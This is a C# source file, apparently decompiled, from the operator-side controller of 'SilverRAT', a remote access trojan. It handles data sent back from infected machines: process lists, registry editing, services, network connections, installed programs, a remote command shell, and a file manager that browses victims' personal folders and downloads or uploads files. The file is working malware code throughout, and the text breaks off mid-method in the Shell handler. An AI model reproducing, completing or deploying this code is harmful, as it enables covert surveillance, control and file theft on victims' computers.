using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using ProtoBuf;
using Server.Helper;
using SilverRAT.Connection;
using SilverRAT.Forms;
using SilverRAT.Helper;
using SilverRAT.MessagePack;
using SilverRAT.Properties;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SilverRAT.Handle_Packet;

internal class HandleManager
{
    public void Connect(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "TaskManager":
                    {
                        Manager manager10 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager10 == null)
                        {
                            client.Disconnected();
                        }
                        else
                        {
                            TaskManager(client, unpack_msgpack);
                        }
                        break;
                    }
                case "RegistryManager":
                    {
                        Manager manager11 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager11 == null)
                        {
                            client.Disconnected();
                        }
                        else
                        {
                            RegManager(client, unpack_msgpack);
                        }
                        break;
                    }
                case "Startup":
                    {
                        Manager manager5 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager5 == null)
                        {
                            client.Disconnected();
                        }
                        Startup(client, unpack_msgpack);
                        break;
                    }
                case "Performance":
                    {
                        Manager manager3 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager3 == null)
                        {
                            client.Disconnected();
                        }
                        Performance(client, unpack_msgpack);
                        break;
                    }
                case "Installed":
                    {
                        Manager manager8 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager8 == null)
                        {
                            client.Disconnected();
                            break;
                        }
                        manager8.ListInstalled.Rows.Clear();
                        string asString2 = unpack_msgpack.ForcePathObject("Data").AsString;
                        string[] array2 = asString2.Split(new string[1] { "-==>" }, StringSplitOptions.None);
                        int num2;
                        for (num2 = 0; num2 <= array2.Length - 1; num2++)
                        {
                            if (array2[num2].Length > 0)
                            {
                                string value3 = array2[num2];
                                string text = array2[num2 + 1];
                                Bitmap bitmap = new Bitmap(Resources.IconInstalled, new Size(24, 24));
                                DataGridViewRow dataGridViewRow2 = new DataGridViewRow
                                {
                                    Height = 24
                                };
                                dataGridViewRow2.Cells.Add(new DataGridViewImageCell
                                {
                                    Value = ((!string.IsNullOrEmpty(text)) ? Image.FromStream(new MemoryStream(Convert.FromBase64String(text))) : bitmap),
                                    ImageLayout = DataGridViewImageCellLayout.Zoom
                                });
                                dataGridViewRow2.Cells.Add(new DataGridViewTextBoxCell
                                {
                                    Value = value3
                                });
                                manager8.ListInstalled.Rows.Insert(0, dataGridViewRow2);
                            }
                            num2++;
                        }
                        break;
                    }
                case "Actived":
                    {
                        Manager manager9 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager9 != null)
                        {
                            if (manager9.Client == null)
                            {
                                manager9.Client = client;
                                manager9.LoaderConnect.Visible = false;
                                manager9.Timer1.Start();
                                MsgPack msgPack = new MsgPack();
                                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                                msgPack.ForcePathObject("Command").AsString = "getDrivers";
                                ThreadPool.QueueUserWorkItem(client.Send, msgPack.Encode2Bytes());
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Shell":
                    {
                        Manager manager6 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager6 == null)
                        {
                            client.Disconnected();
                        }
                        else
                        {
                            Shell(client, unpack_msgpack);
                        }
                        break;
                    }
                case "Service":
                    {
                        Manager manager2 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager2 == null)
                        {
                            client.Disconnected();
                        }
                        else
                        {
                            Service(client, unpack_msgpack);
                        }
                        break;
                    }
                case "Information":
                    {
                        Manager manager7 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager7 != null)
                        {
                            manager7.ListInfo.Rows.Clear();
                            string asString = unpack_msgpack.ForcePathObject("Data").AsString;
                            string[] array = asString.Split(new string[1] { "-==>" }, StringSplitOptions.None);
                            int num;
                            for (num = 0; num <= array.Length - 1; num++)
                            {
                                if (array[num].Length > 0)
                                {
                                    string value = array[num];
                                    string value2 = array[num + 1];
                                    DataGridViewRow dataGridViewRow = new DataGridViewRow
                                    {
                                        Height = 18
                                    };
                                    dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = value
                                    });
                                    dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
                                    {
                                        Value = value2
                                    });
                                    DataGridViewCell dataGridViewCell = dataGridViewRow.Cells[1];
                                    dataGridViewCell.Style.ForeColor = Color.Green;
                                    manager7.ListInfo.Rows.Insert(0, dataGridViewRow);
                                }
                                num++;
                            }
                            manager7.GetInfo.Enabled = true;
                            manager7.DownTypeInfo.Enabled = true;
                            manager7.CountInfo.Text = manager7.ListInfo.RowCount + " items";
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "fileManager":
                    {
                        Manager manager4 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager4 == null)
                        {
                            client.Disconnected();
                        }
                        else
                        {
                            FilesManager(client, unpack_msgpack);
                        }
                        break;
                    }
                case "TCPConnection":
                    {
                        Manager manager = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager == null)
                        {
                            client.Disconnected();
                        }
                        else
                        {
                            TcpConnect(client, unpack_msgpack);
                        }
                        break;
                    }
            }
        }
        catch
        {
        }
    }

    private async void FilesManager(Clients client, MsgPack unpack_msgpack)
    {
        Manager FM = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
        switch (unpack_msgpack.ForcePathObject("Command2").AsString)
        {
            case "Editor":
                {
                    FormNote Editor = (FormNote)Application.OpenForms["Editor:" + unpack_msgpack.ForcePathObject("DWID").AsString];
                    if (Editor != null)
                    {
                        Editor.Client = client;
                        Editor.Complete = true;
                        Editor.TextBox1.Text = unpack_msgpack.ForcePathObject("TXT").AsString;
                        Editor.LoaderConnect.Visible = false;
                        Editor.Save.Enabled = true;
                    }
                    break;
                }
            case "UploadLink":
                {
                    UploadFromLink uploadFromLink = (UploadFromLink)Application.OpenForms["UploadFromLink:" + unpack_msgpack.ForcePathObject("DWID").AsString];
                    if (uploadFromLink != null)
                    {
                        uploadFromLink.Client = client;
                        uploadFromLink.Complete = int.Parse(unpack_msgpack.ForcePathObject("Value").AsString);
                        uploadFromLink.IsConnected = true;
                    }
                    break;
                }
            case "UploadFromLink":
                {
                    UploadFromLink uploadFromLink2 = (UploadFromLink)Application.OpenForms["UploadFromLink:" + unpack_msgpack.ForcePathObject("DWID").AsString];
                    if (uploadFromLink2 != null)
                    {
                        uploadFromLink2.Client = client;
                        uploadFromLink2.FileSave.Text = unpack_msgpack.ForcePathObject("Folder").AsString;
                        uploadFromLink2.PatshSave = unpack_msgpack.ForcePathObject("Folder").AsString;
                        uploadFromLink2.HWID = unpack_msgpack.ForcePathObject("DWID").AsString;
                        uploadFromLink2.LoaderConnect.Visible = false;
                        uploadFromLink2.UploadFile.Enabled = true;
                    }
                    break;
                }
            case "getPath":
                if (FM != null)
                {
                    FM.AreListview2.Visible = true;
                    FM.AeroListView1.Visible = false;
                    FM.TextBox1.Text = unpack_msgpack.ForcePathObject("CurrentPath").AsString;
                    if (FM.TextBox1.Text.EndsWith("\\"))
                    {
                        FM.TextBox1.Text = FM.TextBox1.Text.Substring(0, FM.TextBox1.Text.Length - 1);
                    }
                    if (FM.TextBox1.Text.Length == 2)
                    {
                        FM.TextBox1.Text += "\\";
                    }
                    FM.AreListview2.BeginUpdate();
                    FM.AreListview2.Items.Clear();
                    FM.imageList1.Images.Clear();
                    FM.imageList1.Images.Add("0_folder", Image.FromStream(new MemoryStream(Convert.FromBase64String(""))));
                    FM.AreListview2.Groups.Clear();
                    FM.pr.Value = 50;
                    ListViewGroup groupFolder = new ListViewGroup("Folders");
                    ListViewGroup groupFile = new ListViewGroup("Files");
                    FM.AreListview2.Groups.Add(groupFolder);
                    FM.AreListview2.Groups.Add(groupFile);
                    ListView.ListViewItemCollection items = FM.AreListview2.Items;
                    items.AddRange(await Task.Run(() => GetFolders(unpack_msgpack, groupFolder).ToArray()));
                    ListView.ListViewItemCollection items2 = FM.AreListview2.Items;
                    items2.AddRange(await Task.Run(() => GetFiles(unpack_msgpack, groupFile, FM.imageList1).ToArray()));
                    FM.pr.Value = 100;
                    FM.AreListview2.Enabled = true;
                    FM.AreListview2.Focus();
                    FM.AreListview2.EndUpdate();
                    FM.FolderLen.Text = FM.AreListview2.Groups[0].Items.Count + " Folder  |  " + FM.AreListview2.Groups[1].Items.Count + " Files";
                    FM.pr.Value = 0;
                }
                break;
            case "getDrivers":
                {
                    if (FM == null)
                    {
                        break;
                    }
                    int C = 0;
                    FM.TextBox1.Text = "";
                    FM.AeroListView1.Items.Clear();
                    string[] driver = unpack_msgpack.ForcePathObject("Driver").AsString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                    int j;
                    for (j = 0; j <= driver.Length - 1; j++)
                    {
                        if (driver[j].Length > 0)
                        {
                            ListViewItem lv = new ListViewItem
                            {
                                Text = driver[j],
                                ToolTipText = driver[j]
                            };
                            if (driver[j] == "Desktop")
                            {
                                lv.SubItems.Add(driver[j + 1]);
                                lv.Group = FM.AeroListView1.Groups["Folder"];
                                lv.ImageIndex = 5;
                            }
                            else if (driver[j] == "Downloads")
                            {
                                lv.SubItems.Add(driver[j + 1]);
                                lv.Group = FM.AeroListView1.Groups["Folder"];
                                lv.ImageIndex = 9;
                            }
                            else if (driver[j] == "Documents")
                            {
                                lv.SubItems.Add(driver[j + 1]);
                                lv.Group = FM.AeroListView1.Groups["Folder"];
                                lv.ImageIndex = 8;
                            }
                            else if (driver[j] == "Music")
                            {
                                lv.SubItems.Add(driver[j + 1]);
                                lv.Group = FM.AeroListView1.Groups["Folder"];
                                lv.ImageIndex = 13;
                            }
                            else if (driver[j] == "Pictures")
                            {
                                lv.SubItems.Add(driver[j + 1]);
                                lv.Group = FM.AeroListView1.Groups["Folder"];
                                lv.ImageIndex = 6;
                            }
                            else if (driver[j] == "Videos")
                            {
                                lv.SubItems.Add(driver[j + 1]);
                                lv.Group = FM.AeroListView1.Groups["Folder"];
                                lv.ImageIndex = 7;
                            }
                            else if (driver[j] == "AppData")
                            {
                                lv.SubItems.Add(driver[j + 1]);
                                lv.Group = FM.AeroListView1.Groups["Folder"];
                                lv.ImageIndex = 0;
                            }
                            else if (driver[j] == "User")
                            {
                                lv.SubItems.Add(driver[j + 1]);
                                lv.Group = FM.AeroListView1.Groups["Folder"];
                                lv.ImageIndex = 0;
                            }
                            else
                            {
                                string[] sz = Strings.Split(driver[j + 1], "|Size|");
                                lv.SubItems.Add(Methods.BytesToString(long.Parse(sz[0])) + " free of " + Methods.BytesToString(long.Parse(sz[0])));
                                if (driver[j] == "C:\\")
                                {
                                    lv.Group = FM.AeroListView1.Groups["Devices and Drives"];
                                    lv.ImageIndex = 10;
                                    C++;
                                }
                                else
                                {
                                    lv.Group = FM.AeroListView1.Groups["Devices and Drives"];
                                    lv.ImageIndex = 1;
                                    C++;
                                }
                            }
                            FM.AeroListView1.Items.Add(lv);
                            FM.AeroListView1.Groups["Folder"].Header = "Folder (8)";
                            FM.AeroListView1.Groups["Devices and Drives"].Header = "Devices and Drives (" + C + ")";
                        }
                        j++;
                    }
                    break;
                }
        }
    }

    public async void SocketDownload(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "save":
                    {
                        Manager FM2 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (FM2 == null)
                        {
                            break;
                        }
                        string dwid2 = unpack_msgpack.ForcePathObject("DWID").AsString;
                        _ = unpack_msgpack.ForcePathObject("Size").AsString;
                        int Index2 = int.Parse(unpack_msgpack.ForcePathObject("Index").AsString);
                        byte[] ByteFile = unpack_msgpack.ForcePathObject("ByteFile").GetAsBytes();
                        Control[] temp = FM2.LayoutPanelDownload.Controls.Find("Download:" + dwid2, searchAllChildren: true);
                        try
                        {
                            if (temp.Length == 0)
                            {
                                break;
                            }
                            DownloadUserControl1 uc2 = (DownloadUserControl1)FM2.LayoutPanelDownload.Controls[Index2];
                            lock (uc2.SyncLock)
                            {
                                if (!uc2.IsRunning)
                                {
                                    break;
                                }
                                uc2.FS.Write(ByteFile, 0, ByteFile.Length);
                                uc2.Progss.Value = Convert.ToInt32((double)(uc2.FS.Length * 100L) / (double)uc2.SizeFile);
                                uc2.TitleForm.Text = "(" + Methods.BytesToString(uc2.SizeFile) + "\\" + Methods.BytesToString(uc2.FS.Length) + ") Downloading...";
                                if (uc2.FS.Length >= uc2.SizeFile)
                                {
                                    uc2.TitleForm.Text = "(" + Methods.BytesToString(uc2.FS.Length) + ") Downloaded";
                                    uc2.TitleForm.ForeColor = Color.LimeGreen;
                                    uc2.FS.Close();
                                    File.Move(uc2.ExtraFileTemp, uc2.SaveFile);
                                    uc2.Progss.Value = 0;
                                    uc2.IsRunning = false;
                                }
                            }
                        }
                        catch
                        {
                            DownloadUserControl1 uc = (DownloadUserControl1)FM2.LayoutPanelDownload.Controls[Index2];
                            uc.FS.Close();
                            uc.TitleForm.Text = "Error!";
                            uc.TitleForm.ForeColor = Color.Red;
                            if (File.Exists(uc.ExtraFileTemp))
                            {
                                File.Delete(uc.ExtraFileTemp);
                            }
                            uc.IsRunning = false;
                        }
                        finally
                        {
                            GC.Collect();
                        }
                        break;
                    }
                case "pre":
                    {
                        Manager FM3 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (FM3 == null)
                        {
                            break;
                        }
                        Bitmap bmpIcon = new Bitmap(Resources.IconInstalled, new Size(38, 38));
                        string dwid3 = unpack_msgpack.ForcePathObject("DWID").AsString;
                        _ = unpack_msgpack.ForcePathObject("Filename").AsString;
                        string size = unpack_msgpack.ForcePathObject("Size").AsString;
                        string IconFile = unpack_msgpack.ForcePathObject("Icon").AsString;
                        int Index3 = int.Parse(unpack_msgpack.ForcePathObject("Index").AsString);
                        Control[] temp3 = FM3.LayoutPanelDownload.Controls.Find("Download:" + dwid3, searchAllChildren: true);
                        try
                        {
                            if (temp3.Length != 0)
                            {
                                DownloadUserControl1 uc5 = (DownloadUserControl1)FM3.LayoutPanelDownload.Controls[Index3];
                                uc5.IsRunning = true;
                                uc5.CreateFile();
                                uc5.Progss.Image = ((!string.IsNullOrEmpty(IconFile)) ? Image.FromStream(new MemoryStream(Convert.FromBase64String(IconFile))) : bmpIcon);
                                uc5.WaitingDownload.Visible = false;
                                uc5.SizeFile = long.Parse(size);
                            }
                        }
                        catch (Exception ex2)
                        {
                            Exception ex = ex2;
                            MessageBox.Show("err1" + ex.ToString());
                            DownloadUserControl1 uc3 = (DownloadUserControl1)FM3.LayoutPanelDownload.Controls[Index3];
                            uc3.FS.Close();
                            uc3.Controls.Clear();
                            uc3.IsRunning = false;
                        }
                        break;
                    }
                case "UploadInfo":
                    {
                        Manager FM4 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (FM4 == null)
                        {
                            break;
                        }
                        string dwid4 = unpack_msgpack.ForcePathObject("UPID").AsString;
                        int Index4 = int.Parse(unpack_msgpack.ForcePathObject("Index").AsString);
                        int sizeByte = int.Parse(unpack_msgpack.ForcePathObject("Size").AsString);
                        Control[] temp4 = FM4.LayoutPanelDownload.Controls.Find("Upload:" + dwid4, searchAllChildren: true);
                        if (temp4.Length == 0)
                        {
                            break;
                        }
                        UploadUserControl1 uc6 = (UploadUserControl1)FM4.LayoutPanelDownload.Controls[Index4];
                        try
                        {
                            lock (uc6.SyncLock)
                            {
                                uc6.Progss.Value = Convert.ToInt32(sizeByte);
                                uc6.TitleForm.Text = "(" + Methods.BytesToString(uc6.SizeFile) + "\\" + Methods.BytesToString(sizeByte) + ") Uploading...";
                                if (sizeByte >= uc6.SizeFile)
                                {
                                    uc6.TitleForm.Text = "(" + Methods.BytesToString(sizeByte) + ") Uploaded";
                                    uc6.TitleForm.ForeColor = Color.LimeGreen;
                                    uc6.Progss.Value = 0;
                                    uc6.IsRunning = false;
                                }
                            }
                        }
                        catch
                        {
                            uc6.IsRunning = false;
                            uc6.TitleForm.Text = "( 1 Error ) A failure occurred while uploading the file\r\n!";
                            uc6.TitleForm.ForeColor = Color.Red;
                        }
                        break;
                    }
                case "UploadReady":
                    {
                        Manager FM = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (FM == null)
                        {
                            break;
                        }
                        string dwid = unpack_msgpack.ForcePathObject("UPID").AsString;
                        int Index = int.Parse(unpack_msgpack.ForcePathObject("Index").AsString);
                        Control[] temp2 = FM.LayoutPanelDownload.Controls.Find("Upload:" + dwid, searchAllChildren: true);
                        if (temp2.Length != 0)
                        {
                            UploadUserControl1 uc4 = (UploadUserControl1)FM.LayoutPanelDownload.Controls[Index];
                            try
                            {
                                uc4.IsRunning = true;
                                uc4.WaitingDownload.Visible = false;
                                uc4.Client = client;
                                await uc4.Upload(Index, dwid);
                            }
                            catch
                            {
                                uc4.IsRunning = false;
                                uc4.TitleForm.Text = "( 0 Error ) A failure occurred while uploading the file\r\n!";
                                uc4.TitleForm.ForeColor = Color.Red;
                            }
                        }
                        break;
                    }
            }
        }
        catch
        {
        }
    }

    private List<ListViewItem> GetFolders(MsgPack unpack_msgpack, ListViewGroup listViewGroup)
    {
        string[] array = unpack_msgpack.ForcePathObject("Folder").AsString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
        List<ListViewItem> list = new List<ListViewItem>();
        int num = 0;
        int num2;
        for (num2 = 0; num2 <= array.Length - 1; num2++)
        {
            if (array[num2].Length > 0)
            {
                ListViewItem listViewItem = new ListViewItem
                {
                    Text = array[num2],
                    ToolTipText = array[num2 + 1]
                };
                listViewItem.SubItems.Add(array[num2 + 2]);
                listViewItem.SubItems.Add("Folder");
                listViewItem.SubItems.Add("");
                listViewItem.Group = listViewGroup;
                listViewItem.ImageIndex = 0;
                list.Add(listViewItem);
                num++;
            }
            num2 += 2;
        }
        return list;
    }

    private List<ListViewItem> GetFiles(MsgPack unpack_msgpack, ListViewGroup listViewGroup, ImageList imageList1)
    {
        string[] Files = unpack_msgpack.ForcePathObject("File").AsString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
        List<ListViewItem> list = new List<ListViewItem>();
        for (int i = 0; i <= Files.Length - 1; i++)
        {
            if (Files[i].Length > 0)
            {
                ListViewItem listViewItem = new ListViewItem
                {
                    Text = Path.GetFileName(Files[i]),
                    ToolTipText = Files[i + 1]
                };
                Image im = Image.FromStream(new MemoryStream(Convert.FromBase64String(Files[i + 2])));
                Program.Silver.Invoke((MethodInvoker)delegate
                {
                    imageList1.Images.Add(Files[i + 1], im);
                });
                listViewItem.ImageKey = Files[i + 1];
                listViewItem.Group = listViewGroup;
                listViewItem.SubItems.Add(Files[i + 3]);
                FileInfo fileInfo = new FileInfo(Files[i]);
                string text = Methods.FilesType(fileInfo.Extension);
                listViewItem.SubItems.Add(text);
                listViewItem.SubItems.Add(Methods.BytesToString(Convert.ToInt64(Files[i + 5])));
                list.Add(listViewItem);
            }
            i += 5;
        }
        return list;
    }

    public void AddToListInfo(string IDForm, Guna2DataGridView DGV, bool State, string Msg)
    {
        try
        {
            Manager manager = (Manager)Application.OpenForms["Manager:" + IDForm];
            if (manager != null && manager.Client != null)
            {
                DataGridViewRow dataGridViewRow = new DataGridViewRow
                {
                    Height = 18
                };
                dataGridViewRow.Cells.Add(new DataGridViewImageCell
                {
                    Value = (State ? Resources.SuccessNotif : Resources.ErrorNotif),
                    ImageLayout = DataGridViewImageCellLayout.Zoom
                });
                dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
                {
                    Value = Msg
                });
                DataGridViewCell dataGridViewCell = dataGridViewRow.Cells[2];
                dataGridViewCell.Style.ForeColor = Color.Green;
                DGV.Rows.Insert(0, dataGridViewRow);
            }
        }
        catch
        {
        }
    }

    public void AddToListLogs(string IDForm, Guna2DataGridView DGV, bool State, string Msg)
    {
        try
        {
            Manager manager = (Manager)Application.OpenForms["Manager:" + IDForm];
            if (manager != null && manager.Client != null)
            {
                DataGridViewRow dataGridViewRow = new DataGridViewRow
                {
                    Height = 24
                };
                dataGridViewRow.Cells.Add(new DataGridViewImageCell
                {
                    Value = (State ? Resources.SuccessNotif : Resources.ErrorNotif),
                    ImageLayout = DataGridViewImageCellLayout.Zoom
                });
                dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
                {
                    Value = Msg
                });
                DataGridViewCell dataGridViewCell = dataGridViewRow.Cells[1];
                if (State)
                {
                    dataGridViewCell.Style.ForeColor = Color.Green;
                }
                else if (!State)
                {
                    dataGridViewCell.Style.ForeColor = Color.Red;
                }
                else
                {
                    dataGridViewCell.Style.ForeColor = Color.Black;
                }
                DGV.Rows.Insert(0, dataGridViewRow);
            }
        }
        catch
        {
        }
    }

    public void RegManager(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            switch (unpack_msgpack.ForcePathObject("Command2").AsString)
            {
                case "RenameValue":
                    {
                        Manager manager2 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager2 != null)
                        {
                            string asString2 = unpack_msgpack.ForcePathObject("keyPath").AsString;
                            string asString3 = unpack_msgpack.ForcePathObject("OldValueName").AsString;
                            string asString4 = unpack_msgpack.ForcePathObject("NewValueName").AsString;
                            manager2.RenameValue(asString2, asString3, asString4);
                        }
                        break;
                    }
                case "DeleteValue":
                    {
                        Manager manager6 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager6 != null)
                        {
                            string asString10 = unpack_msgpack.ForcePathObject("keyPath").AsString;
                            string asString11 = unpack_msgpack.ForcePathObject("ValueName").AsString;
                            manager6.DeleteValue(asString10, asString11);
                        }
                        break;
                    }
                case "DeleteKey":
                    {
                        Manager manager7 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager7 != null)
                        {
                            string asString12 = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                            string asString13 = unpack_msgpack.ForcePathObject("KeyName").AsString;
                            manager7.DeleteKey(asString12, asString13);
                        }
                        break;
                    }
                case "LoadKey":
                    {
                        Manager manager4 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager4 != null)
                        {
                            string asString6 = unpack_msgpack.ForcePathObject("RootKey").AsString;
                            byte[] asBytes3 = unpack_msgpack.ForcePathObject("Matches").GetAsBytes();
                            manager4.AddKeys(asString6, DeSerializeMatches(asBytes3));
                        }
                        break;
                    }
                case "RenameKey":
                    {
                        Manager manager8 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager8 != null)
                        {
                            string asString14 = unpack_msgpack.ForcePathObject("rootKey").AsString;
                            string asString15 = unpack_msgpack.ForcePathObject("oldName").AsString;
                            string asString16 = unpack_msgpack.ForcePathObject("newName").AsString;
                            manager8.RenameKey(asString14, asString15, asString16);
                        }
                        break;
                    }
                case "CreateValue":
                    {
                        Manager manager5 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager5 != null)
                        {
                            string asString7 = unpack_msgpack.ForcePathObject("keyPath").AsString;
                            string asString8 = unpack_msgpack.ForcePathObject("Kindstring").AsString;
                            string asString9 = unpack_msgpack.ForcePathObject("newKeyName").AsString;
                            RegistryValueKind kind = RegistryValueKind.None;
                            switch (asString8)
                            {
                                case "11":
                                    kind = RegistryValueKind.QWord;
                                    break;
                                case "-1":
                                    kind = RegistryValueKind.None;
                                    break;
                                case "7":
                                    kind = RegistryValueKind.MultiString;
                                    break;
                                case "4":
                                    kind = RegistryValueKind.DWord;
                                    break;
                                case "0":
                                    kind = RegistryValueKind.Unknown;
                                    break;
                                case "1":
                                    kind = RegistryValueKind.String;
                                    break;
                                case "2":
                                    kind = RegistryValueKind.ExpandString;
                                    break;
                                case "3":
                                    kind = RegistryValueKind.Binary;
                                    break;
                            }
                            RegistrySeeker.RegValueData regValueData = new RegistrySeeker.RegValueData();
                            regValueData.Name = asString9;
                            regValueData.Kind = kind;
                            regValueData.Data = new byte[0];
                            manager5.CreateValue(asString7, regValueData);
                        }
                        break;
                    }
                case "ChangeValue":
                    {
                        Manager manager3 = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager3 != null)
                        {
                            string asString5 = unpack_msgpack.ForcePathObject("keyPath").AsString;
                            byte[] asBytes2 = unpack_msgpack.ForcePathObject("Value").GetAsBytes();
                            manager3.ChangeValue(asString5, DeSerializeRegValueData(asBytes2));
                        }
                        break;
                    }
                case "CreateKey":
                    {
                        Manager manager = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (manager != null)
                        {
                            string asString = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                            byte[] asBytes = unpack_msgpack.ForcePathObject("Match").GetAsBytes();
                            manager.CreateNewKey(asString, DeSerializeMatch(asBytes));
                        }
                        break;
                    }
            }
        }
        catch
        {
        }
    }

    public static RegistrySeeker.RegSeekerMatch[] DeSerializeMatches(byte[] bytes)
    {
        using MemoryStream source = new MemoryStream(bytes);
        return Serializer.Deserialize<RegistrySeeker.RegSeekerMatch[]>((Stream)source);
    }

    public static RegistrySeeker.RegSeekerMatch DeSerializeMatch(byte[] bytes)
    {
        using MemoryStream source = new MemoryStream(bytes);
        return Serializer.Deserialize<RegistrySeeker.RegSeekerMatch>((Stream)source);
    }

    public static RegistrySeeker.RegValueData DeSerializeRegValueData(byte[] bytes)
    {
        using MemoryStream source = new MemoryStream(bytes);
        return Serializer.Deserialize<RegistrySeeker.RegValueData>((Stream)source);
    }

    private static void Service(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            Manager manager = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
            if (manager != null)
            {
                manager.ListServices.Rows.Clear();
                manager.Admin = bool.Parse(unpack_msgpack.ForcePathObject("Admin").AsString);
                string asString = unpack_msgpack.ForcePathObject("Message").AsString;
                string[] array = asString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                int num;
                for (num = 0; num <= array.Length - 1; num++)
                {
                    if (array[num].Length > 0)
                    {
                        manager.ListServices.Rows.Add(manager.ImageListServices.Images[array[num + 4] + ".png"], array[num], array[num + 1], array[num + 3], array[num + 2]);
                    }
                    num += 4;
                }
            }
            else
            {
                client.Disconnected();
            }
        }
        catch
        {
        }
    }

    private static void TcpConnect(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            Manager manager = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
            if (manager != null)
            {
                manager.ListConnection.Rows.Clear();
                string asString = unpack_msgpack.ForcePathObject("Message").AsString;
                string[] array = asString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                int num;
                for (num = 0; num <= array.Length - 1; num++)
                {
                    if (array[num].Length > 0)
                    {
                        manager.ListConnection.Rows.Add(manager.imageList_0.Images[CheckState(array[num + 4]) + ".png"], array[num], array[num + 1], array[num + 3], array[num + 2], array[num + 4]);
                    }
                    num += 4;
                }
            }
            else
            {
                client.Disconnected();
            }
        }
        catch
        {
        }
    }

    private static string CheckState(string Txt)
    {
        string text = "Closed";
        string text2 = "Listen";
        string text3 = "Sent";
        string text4 = "Received";
        string text5 = "Established";
        string text6 = "Closeing";
        if (Txt.Contains(text) || Txt == text)
        {
            return text;
        }
        if (Txt.Contains(text2) || Txt == text2)
        {
            return text2;
        }
        if (Txt.Contains(text3) || Txt == text3)
        {
            return text3;
        }
        if (Txt.Contains(text4) || Txt == text4)
        {
            return text4;
        }
        if (Txt.Contains(text5) || Txt == text5)
        {
            return text5;
        }
        if (Txt.Contains(text6) || Txt == text6)
        {
            return text6;
        }
        return "Other";
    }

    private static void TaskManager(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            Manager manager = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
            if (manager != null)
            {
                manager.ListProcess.Rows.Clear();
                string asString = unpack_msgpack.ForcePathObject("Message").AsString;
                string[] array = asString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                int num;
                for (num = 0; num <= array.Length - 1; num++)
                {
                    if (array[num].Length > 0)
                    {
                        string text = array[num];
                        string fileName = Path.GetFileName(text);
                        string text2 = array[num + 1];
                        Image image = Image.FromStream(new MemoryStream(Convert.FromBase64String(array[num + 2])));
                        if (manager == null)
                        {
                            break;
                        }
                        manager.ListProcess.Rows.Add(image, fileName, text2, text);
                    }
                    num += 2;
                }
            }
            else
            {
                client.Disconnected();
            }
        }
        catch
        {
        }
    }

    private static void Shell(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            Manager manager = (Manager)Application.OpenForms["Manager:" + unpack_msgpack.ForcePathObject("ID").AsString];
            if (manager != null)
            {
                manager.BoxCmd.AppendText(unpack_msgpack.ForcePathObject("ReadInput").AsString);
